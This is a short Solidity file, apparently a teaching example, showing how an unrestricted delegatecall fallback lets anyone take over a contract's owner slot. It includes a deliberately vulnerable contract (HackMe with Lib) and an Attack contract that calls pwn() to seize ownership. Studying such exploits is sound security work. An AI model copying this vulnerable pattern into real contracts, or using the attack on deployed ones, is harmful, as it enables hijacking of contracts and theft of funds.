
// de;legate call changes the context of the contract

// this contract says how to change the owner of the contract using delegate call

pragma solidity ^0.6.10;

contract HackMe {
    address public owner;
     Lib public lib;
     
     constructor(Lib _lib) public {
         owner = msg.sender;
         lib = Lib(_lib);
     }
     
     fallback() external payable {
        (bool data, ) = address(lib).delegatecall(msg.data);
     }
}

contract Lib {
    address public owner;
    
    function pwn() public {
        owner = msg.sender;
        
    }
}

contract Attack {
    address public hackMe;
    
    constructor(address _hackme) public {
        hackMe = _hackme;
    }
    
    function attack() public {
        hackMe.call(abi.encodeWithSignature("pwn()"));
    }
}
